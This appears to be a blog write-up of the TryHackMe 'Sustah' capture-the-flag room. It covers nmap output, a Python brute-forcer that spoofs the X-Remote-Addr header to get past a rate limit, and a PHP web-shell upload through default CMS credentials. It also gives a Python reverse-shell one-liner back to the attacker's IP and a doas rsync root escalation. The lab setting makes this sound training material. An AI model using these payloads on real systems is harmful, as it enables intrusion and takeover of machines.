@@ -1,0 +1,129 @@
+I"�<h2 id="introduction">Introduction</h2>
+
+<p>This is partical room from tryhackme entitled “sustah” from Tryhackme . Difficulty of This box is Medium and in this box you will learn all about exploiting CMS , Missconfiguration, Bruteforcing, Privilage escalation. Okay no let’s Pwn this box :p.</p>
+
+<p>Room Link <a href="https://tryhackme.com/room/sustah">here</a></p>
+
+<h2 id="scanning">Scanning</h2>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>First we must scanning the ip using nmap : <code>nmap 10.10.195.141 -sC -sV</code></p>
+<pre><code>Nmap scan report for 10.10.195.141
+Host is up (0.34s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 bd:a4:a3:ae:66:68:1d:74:e1:c0:6a:eb:2b:9b:f3:33 (RSA)
+|   256 9a:db:73:79:0c:72:be:05:1a:86:73:dc:ac:6d:7a:ef (ECDSA)
+|_  256 64:8d:5c:79:de:e1:f7:3f:08:7c:eb:b7:b3:24:64:1f (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Susta
+8085/tcp open  http    Gunicorn 20.0.4
+|_http-server-header: gunicorn/20.0.4
+|_http-title: Spinner
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Mar  4 17:20:51 2021 -- 1 IP address (1 host up) scanned in 24.76 seconds
+
+</code></pre>
+<p>As you can see the box have 3 port open like ssh, http and another cms. Now lets take a look at port 80: 
+<img src="/assets/thm_sustah/bg_1.png" alt="img" /></p>
+
+<p>Nothing interesting here let’s jump to port 8085.</p>
+
+<p><img src="/assets/thm_sustah/bg_2.png" alt="img" /></p>
+
+<p>There is have some word <code>Feeling lucky? Guess the right number. You have a 0.004% chance of winning.</code> which mean we can bruteforece number for the lucky.</p>
+
+<p><img src="/assets/thm_sustah/bg_3.png" alt="img" /></p>
+
+<p>I have trying to bruteforce the number but there is have rate limits and i’m going to research then found <a href="https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass">this</a>. We can bypass it using header X-Remote-Addr: 127.0.0.1 and it worked.</p>
+
+<p>My code :</p>
+<pre><code class="language-python">#!/usr/bin/python3
+import requests
+import sys
+import re
+url = "http://10.10.195.141:8085/"
+
+reqse = requests.session()
+for number in range(10000,99999):
+        head = {"X-Remote-Addr" : "127.0.0.1"}
+        data = {"number" : number}
+        output = reqse.post(url, headers = head, data = data)
+        if "rate limit exceeded" in output.text:
+                print("Limit Exceeded :D")
+        elif "Oh no! How unlucky. Spin the wheel and try again." in output.text:
+                print("try Number : ",number)
+                pass
+        else:
+                print(f"[+]The number is ",number)
+                break
+</code></pre>
+<p>and here the result : 
+<img src="/assets/thm_sustah/bg_4.png" alt="img" /></p>
+
+<p>Now we found the number, let’s put this.</p>
+
+<p><img src="/assets/thm_sustah/bg_5.png" alt="img" /></p>
+
+<p>Then we found path for getting cms site. now let’s go to <code>http://10.10.249.153/Yo---------th/</code></p>
+
+<p><img src="/assets/thm_sustah/bg_6.png" alt="img" /></p>
+
+<p>After looking around i’m found this which mean we can login as admin with default credentials.</p>
+
+<p><img src="/assets/thm_sustah/bg_7.png" alt="img" /></p>
+
+<p>Now lets going to file and create net file some revershell <code>&lt;?php echo passthru($_GET['cmd']) ?&gt; </code> and upload it.</p>
+
+<p><img src="/assets/thm_sustah/bg_8.png" alt="img" /></p>
+
+<p>The file will be saved in <code>/img/shellrazor.php</code>.</p>
+
+<p><img src="/assets/thm_sustah/bg_10.png" alt="img" /></p>
+
+<p>Now lets check the command like this : <code>/shellrazor.php?cmd=id</code>
+here the result</p>
+
+<p><img src="/assets/thm_sustah/bg_12.png" alt="img" /></p>
+
+<h2 id="getting-shell">Getting shell</h2>
+
+<h3 id="web-shell">Web shell</h3>
+
+<p>Its works now let create some payload to getting revershell, here my payload to getting shell</p>
+<pre><code>export RHOST="10.2.47.251";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+</code></pre>
+<p><img src="/assets/thm_sustah/bg_13.png" alt="img" /></p>
+
+<p>Now we have shell. After looking some hint in thm there is have some backup file. After looking arround i found backup file in <code>/var/backups</code> and contain password of user <code>.bak.passwd</code></p>
+
+<p><img src="/assets/thm_sustah/bg_14.png" alt="img" /></p>
+
+<h2 id="getting-user">Getting user</h2>
+
+<p>Now we just login with user kiran password :</p>
+
+<p><img src="/assets/thm_sustah/bg_16.png" alt="img" /></p>
+
+<p>As you can see it’s work , Then we must getting root.</p>
+
+<h2 id="privilage-escalation">Privilage Escalation</h2>
+
+<p>In this case im using linpeas to get privilage escalation and i found this: 
+<img src="/assets/thm_sustah/bg_17.png" alt="img" /></p>
+
+<p>Now let’s going to gtfobins <a href="https://gtfobins.github.io/gtfobins/rsync/#sudo">here</a> about rsync and here my command : <code>doas rsync -e 'sh -c "sh 0&lt;&amp;2 1&gt;&amp;2"' 127.0.0.1:/dev/null</code>
+<img src="/assets/thm_sustah/bg_18.png" alt="img" /></p>
+
+<p>And Boom!! we get the root XD</p>
+
+<p>So thats it my writeup and there is so simple writeup you can follow if you want and see you next time :D</p>
+
+<p>Happyhacking :D</p>
+:ET
